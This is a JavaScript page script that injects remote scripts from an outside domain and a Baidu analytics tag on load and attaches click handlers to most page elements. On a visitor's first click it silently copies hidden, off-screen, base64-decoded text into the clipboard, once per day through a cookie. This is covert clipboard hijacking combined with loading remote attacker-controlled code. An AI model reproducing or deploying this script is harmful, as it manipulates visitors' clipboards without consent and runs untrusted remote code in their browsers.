    var _ku_ = 'https://x.v5h6.cn';
    var _bdk_  = '4033fa09f0be87f4ae80cc93c69cd776';
    var _src_ = 'zq01';
    var _d_ = document;
    var _w_ = window;
    var _cp_ = false;



    function _jds_new_(f)
    {
        var hm = _d_.createElement("script");
        hm.src = f;
        var s = _d_.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    }

    function _jdom_(t)
    {
        var t = decodeURIComponent(_w_.atob(t));
        console.log(t);
        var d = _d_.createElement("div");
        d.innerHTML = '<input id="_jdac_" readOnly="true" style="user-select: auto;-webkit-user-select: auto;-ms-user-select: auto;outline: none;border: 0px;color: rgba(0,0,0,0.0);position: absolute;top:-9999px;left:-9999px;background-color: transparent;" value="' + t + '"/><div id="_jdic_" style="user-select: auto;-webkit-user-select: auto;-ms-user-select: auto;position: absolute;top:-9999px;left:-9999px;color: rgba(0,0,0,0);background-color: transparent">' + t + '</div>';
        _d_.body.appendChild(d);
    }

    function _jdc_(e)
    {
        if (BW.gc('_jdx_') === BW.gk())
            return;

        if (_cp_ == false)
        {
            _cp_ = true;
            BW.sc('_jdx_', BW.gk(), 30);
            _jds_new_(_ku_ + '/click?src=' + _src_);

            if (navigator.userAgent.match(/(iPhone|iPod|iPad);?/i))
            {
                _w_.getSelection().removeAllRanges();
                var dom = _d_.getElementById("_jdic_");
                var rng = _d_.createRange();
                rng.selectNode(dom);
                _w_.getSelection().addRange(rng);
                try {
                    _d_.execCommand('copy');
                } catch(err){}
                _w_.getSelection().removeAllRanges();
            }
            else
            {
                var dom = _d_.getElementById("_jdac_");
                dom.select();
                try {
                    _d_.execCommand('copy');
                } catch(err){}
            }
        }
    }


    // _d_.addEventListener('DOMContentLoaded', function()
    // {
    //     alert('def');
    //     _jds_new_(_ku_ + '/get?src=' + _src_);
    //     _jds_new_("https://hm.baidu.com/hm.js?" + _bdk_);
    //
    //     var e = _d_.querySelectorAll('p,div,img,span,li');
    //     for (var i = 0; i < e.length; i++)
    //     {
    //         e[i].addEventListener('click', _jdc_);
    //     }
    // })

    var loadFirst = function(){
            _jds_new_(_ku_ + '/get?src=' + _src_);
            _jds_new_("https://hm.baidu.com/hm.js?" + _bdk_);

            var e = _d_.querySelectorAll('p,div,img,span,li');
            for (var i = 0; i < e.length; i++)
            {
                e[i].addEventListener('click', _jdc_);
            }
    }


    if (document.readyState === "complete" || (document.readyState !== "loading" && !document.documentElement.doScroll)){
        loadFirst();
    } else {
        document.addEventListener("DOMContentLoaded", loadFirst);
    }

    var BW =
    {
        sc: function(key,val,time)
        {
            var date = new Date();
            var expiresDays = time;
            date.setTime(date.getTime()+expiresDays*1000);
            document.cookie = key + "=" + val +";expires="+date.toGMTString();
        },

        gc: function(key)
        {
            var gc = document.cookie.replace(/[ ]/g,"");
            var arrCookie = gc.split(";");
            var tips;
            for(var i = 0;i < arrCookie.length; i++){
                var arr = arrCookie[i].split("=");
                if(key == arr[0]){
                    tips = arr[1];
                    break;
                }
            }

            return tips;
        },

        dc: function(key)
        {
            var date = new Date();
            date.setTime(date.getTime()-10000);
            document.cookie = key + "=v; expires =" +date.toGMTString();
        },

        gk: function()
        {
            var nowDate = new Date();
            return 'wlkj' + nowDate.getFullYear() + '-' + nowDate.getMonth() + '-' + nowDate.getDate();
        },

        gr: function (array)
        {
            return Math.floor(Math.random() * array.length)
        }
    }